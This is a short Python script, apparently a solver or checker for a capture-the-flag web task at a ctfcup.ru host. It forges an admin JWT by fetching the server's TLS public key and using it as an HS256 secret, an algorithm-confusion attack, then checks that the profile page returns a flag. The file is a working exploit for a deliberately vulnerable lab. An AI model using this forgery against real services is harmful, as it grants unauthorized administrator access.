import requests
import ssl
import jwt
import os


hostname = 'simple.web.ctfcup.ru'
port = 5937
host = f"https://{hostname}:{port}"

login = requests.post(host + '/login', data={
    "login": "test",
    "password": "test"
}, allow_redirects=True)

assert login.history[0].status_code != str(302), "Проблема при редиректе после логина"
token = login.history[0].cookies.get("token", False)

assert token, "Проблема с получением токена доступа"

if "is_admin" not in login.text:
    Exception("Получили странную страницу профиля на шаге 1")


cert = ssl.get_server_certificate((hostname, port))

with open('cert.pem', 'w') as file:
    file.write(cert)

os.system("openssl x509 -pubkey -noout -in cert.pem > pubkey.pem")

with open('pubkey.pem', 'r') as file:
    pubkey = file.read()
print(pubkey)
pubkey = pubkey.replace("-----BEGIN PUBLIC KEY-----", '').replace("-----END PUBLIC KEY-----", '').strip('\n')

print(pubkey)

jwt_key = jwt.encode({
    "login": 'test',
    'is_admin': True
}, pubkey, algorithm="HS256")
print(jwt_key)
final_page = requests.get(host + '/profile', cookies={'token': jwt_key})
print(final_page)
print(final_page.text)
if 'CUP{' in final_page.text:
    print('Task is working')

# Чистим за собой
os.remove('cert.pem')
os.remove('pubkey.pem')
